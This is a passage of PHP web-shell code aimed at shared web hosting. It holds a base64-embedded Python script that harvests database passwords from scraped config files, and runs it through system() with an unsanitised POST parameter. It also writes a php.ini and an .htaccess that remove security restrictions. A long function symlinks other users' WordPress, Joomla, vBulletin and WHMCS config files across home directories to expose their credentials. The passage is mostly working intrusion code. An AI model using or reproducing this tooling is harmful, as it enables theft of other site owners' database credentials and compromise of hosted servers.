'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCicnJw0KQnk6IEFobWVkIFNoYXdreSBha2EgbG54ZzMzaw0KdGh4OiBPYnp5LCBSZWxpaywgbW9oYWIgYW5kICNhcmFicHduIA0KJycnDQoNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJlDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHVybGxpYg0KaW1wb3J0IGdsb2INCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KDQppZiBsZW4oc3lzLmFyZ3YpICE9IDM6DQogIHByaW50JycnCQ0KIFVzYWdlOiAlcyBbVVJMLi4uXSBbZGlyZWN0b3J5Li4uXQ0KIEV4KSAlcyBodHRwOi8vd3d3LnRlc3QuY29tL3Rlc3QvIFtkaXIgLi4uXScnJyAlIChzeXMuYXJndlswXSwgc3lzLmFyZ3ZbMF0pDQogIHN5cy5leGl0KDEpDQoNCnNpdGUgPSBzeXMuYXJndlsxXQ0KZm91dCA9IHN5cy5hcmd2WzJdDQoNCnRyeToNCiAgcmVxICA9IHVybGxpYi51cmxvcGVuKHNpdGUpDQogIHJlYWQgPSByZXEucmVhZCgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAndycpDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZiA9IG9wZW4oJ2RhdGEudHh0JywgJ3cnKSAgDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KDQogIGkgPSAwDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBmID0gb3BlbignZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgY2xlYW51cCA9IHN1YnByb2Nlc3MuUG9wZW4oJ3JtIC1yZiAvdG1wL2RhdGEudHh0ID4gL2Rldi9udWxsJywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBjbGVhbnVwID0gc3VicHJvY2Vzcy5Qb3BlbignZGVsIEM6XGRhdGEudHh0Jywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIHByaW50ICdcbicsICctJyAqIDEwMCwgJ1xuJw0KICBpZiBzeXN0ZW0oKSA9PSAnTGludXgnOg0KICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGZvdXQpOg0KICAgICAgZm9yIGZuYW1lIGluIGZpbGVzOg0KICAgICAgICBmdWxscGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmbmFtZSkNCiAgICAgICAgZiA9IG9wZW4oZnVsbHBhdGgsICdyJykNCiAgICAgICAgZm9yIGxpbmUgaW4gZjoNCiAgICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3IgaXMgbm90IE5vbmU6IHByaW50IChzZWNyLmdyb3VwKDIpKSAgDQogICAgICAgICAgc2VjcjEgPSByZS5zZWFyY2gociIocGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3IyID0gcmUuc2VhcmNoKHIiKERCX1BBU1NXT1JEJykoLi4uKSguK1tePl0pKCcpIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyMiBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3IyLmdyb3VwKDMpKQ0KICAgICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjMgaXMgbm90IE5vbmU6IHByaW50IChzZWNyMy5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNCA9IHJlLnNlYXJjaCAociIoREJQQVNTV09SRCA9ICcpKC4rW14+XSkoLjspIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3I1ID0gcmUuc2VhcmNoIChyIihEQnBhc3MgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjUgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNS5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjYgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNi5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNyA9IHJlLnNlYXJjaCAociIobW9zQ29uZmlnX3Bhc3N3b3JkID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZm9yIGluZmlsZSBpbiBnbG9iLmdsb2IoIG9zLnBhdGguam9pbihmb3V0LCAnKi50eHQnKSApOg0KICAgICAgZiA9IG9wZW4oaW5maWxlLCAncicpDQogICAgICBmb3IgbGluZSBpbiBmOg0KICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyIGlzIG5vdCBOb25lOiBwcmludCAoc2Vjci5ncm91cCgyKSkgIA0KICAgICAgICBzZWNyMSA9IHJlLnNlYXJjaChyIihwYXNzd29yZCA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkNCiAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICBzZWNyMiA9IHJlLnNlYXJjaChyIihEQl9QQVNTV09SRCcpKC4uLikoLitbXj5dKSgnKSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IyIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjIuZ3JvdXAoMykpDQogICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IzIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjMuZ3JvdXAoMikpDQogICAgICAgIHNlY3I0ID0gcmUuc2VhcmNoIChyIihEQlBBU1NXT1JEID0gJykoLitbXj5dKSguOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNSA9IHJlLnNlYXJjaCAociIoREJwYXNzID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNSBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I1Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I2IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjYuZ3JvdXAoMikpDQogICAgICAgIHNlY3I3ID0gcmUuc2VhcmNoIChyIihtb3NDb25maWdfcGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICBmLmNsb3NlKCkNCmV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQpOg0KICBwcmludCAnXG5UaGFua3MgZm9yIHVzaW5nIGl0IC5fXic=';
$file = fopen("cp.py","w+");
$write = fwrite ($file ,base64_decode($cp));
fclose($file);
chmod("cp.py",0755);
$url = $_POST['url'];
echo"<center>
<textarea cols=\"90\" rows=\"20\" name=\"usernames\">";
system("python cp.py $url config");
unlink ('cp.py');
echo"</textarea>
</center>";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF']."?brute>BACK</a>";
exit;
}
if($_POST['matikan']=='sekatan'){
@error_reporting(0);
$phpini =
'c2FmZV9tb2RlPU9GRg0KZGlzYWJsZV9mdW5jdGlvbnM9Tk9ORQ==';
$file = fopen("php.ini","w+");
$write = fwrite ($file ,base64_decode($phpini));
fclose($file);
$htaccess =
'T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ==';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
echo "<hr><center><b>DONE!";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF']."?brute>BACK</a>";
exit;
}
if($_POST['mendapatkan']=='passwd'){
@set_magic_quotes_runtime(0);
ob_start();
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$fn = $_POST['foldername'];
//all function here

function syml($usern,$pdomain)
	{
		symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
